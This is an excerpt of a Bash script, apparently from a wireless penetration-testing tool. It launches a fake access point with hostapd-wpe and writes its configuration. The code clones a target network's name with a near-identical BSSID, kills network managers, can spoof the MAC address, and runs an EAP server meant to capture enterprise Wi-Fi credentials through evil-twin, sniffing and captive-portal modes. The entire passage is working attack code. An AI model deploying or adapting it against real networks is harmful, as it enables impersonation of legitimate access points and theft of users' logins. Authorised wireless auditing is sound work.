#Launch hostapd and hostapd-wpe fake Access Point
function launch_fake_ap() {

	debug_print

	if [ -n "${enterprise_mode}" ]; then
		kill "$(ps -C hostapd-wpe --no-headers -o pid | tr -d ' ')" &> /dev/null
	else
		kill "$(ps -C hostapd --no-headers -o pid | tr -d ' ')" &> /dev/null
	fi

	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	else
		if [ "${check_kill_needed}" -eq 1 ]; then
			${airmon} check kill > /dev/null 2>&1
			nm_processes_killed=1
		fi
	fi

	if [ ${mac_spoofing_desired} -eq 1 ]; then
		set_spoofed_mac "${interface}"
	fi

	recalculate_windows_sizes
	local command
	local log_command

	if [ -n "${enterprise_mode}" ]; then
		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
		hostapd_scr_window_position=${g1_topleft_window}
	else
		command="hostapd \"${tmpdir}${hostapd_file}\""
		log_command=""
		case ${et_mode} in
			"et_onlyap")
				hostapd_scr_window_position=${g1_topleft_window}
			;;
			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
				hostapd_scr_window_position=${g3_topleft_window}
			;;
			"et_sniffing_sslstrip2")
				hostapd_scr_window_position=${g4_topleft_window}
			;;
		esac
	fi
	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${command}"
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi

	sleep 3
}


#Create configuration file for hostapd
function set_hostapd_wpe_config() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1

	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}

	{
	echo -e "interface=${interface}"
	echo -e "driver=nl80211"
	echo -e "ssid=${essid}"
	echo -e "bssid=${et_bssid}"
	} >> "${tmpdir}${hostapd_wpe_file}"

	if [ "${channel}" -gt 14 ]; then
		et_channel=$(shuf -i 1-11 -n 1)
	else
		et_channel="${channel}"
	fi

	{
	echo -e "channel=${et_channel}"
	echo -e "eap_server=1"
	echo -e "eap_fast_a_id=101112131415161718191a1b1c1d1e1f"
	echo -e "eap_fast_a_id_info=hostapd-wpe"
	echo -e "eap_fast_prov=3"
	echo -e "ieee8021x=1"
	echo -e "pac_key_lifetime=604800"
	echo -e "pac_key_refresh_time=86400"
	echo -e "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f"
	echo -e "wpa=2"
	echo -e "wpa_key_mgmt=WPA-EAP"
	echo -e "wpa_pairwise=CCMP"
	echo -e "rsn_pairwise=CCMP"
	echo -e "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user"
	} >> "${tmpdir}${hostapd_wpe_file}"

	{
	echo -e "ca_cert=${hostapd_wpe_cert_path}ca.pem"
	echo -e "server_cert=${hostapd_wpe_cert_path}server.pem"
	echo -e "private_key=${hostapd_wpe_cert_path}server.key"
	echo -e "private_key_passwd=${hostapd_wpe_cert_pass}"
	} >> "${tmpdir}${hostapd_wpe_file}"
}
